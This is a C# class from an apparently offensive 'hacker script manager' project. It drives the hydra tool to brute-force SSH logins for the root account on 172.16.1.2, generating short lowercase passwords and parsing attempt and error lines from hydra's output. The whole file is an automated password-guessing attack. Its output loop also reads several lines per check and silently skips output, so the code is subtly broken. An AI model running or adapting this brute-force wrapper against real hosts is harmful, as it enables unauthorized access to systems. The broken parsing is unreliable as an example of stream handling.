using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Text.RegularExpressions;

namespace hacker_script_manager
{
    class HydraScript : Script
    {
        
        private void ShowMatch(string text, string expr)
        {
            MatchCollection mc = Regex.Matches(text, expr);
            foreach (Match m in mc)
            {
                Console.WriteLine(m);
               
                Outputs.Add(m.ToString());
               


            }
        }

        public override void Start_Script()
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = @"/usr/bin/hydra";
          
            p.StartInfo.Arguments = string.Format("-l root -x 3:5:a 172.16.1.2 -t 4 ssh -v -V -I");
            p.Start();

            while (!p.StandardOutput.EndOfStream)
            {
                if (p.StandardOutput.ReadLine().Contains("[ATTEMPT]"))
                {
                    ShowMatch(p.StandardOutput.ReadLine(), @"([^\-]+$)");
                }
                else if (p.StandardOutput.ReadLine().Contains("[ERROR]"))
                {
                    var pattern = @"\[(\w*)\]";
                    var replaced = Regex.Replace(p.StandardOutput.ReadLine(), pattern, "?");
                    ShowMatch(replaced, @"(?<=\?).*");
                }

            }
       
        }
    }
}
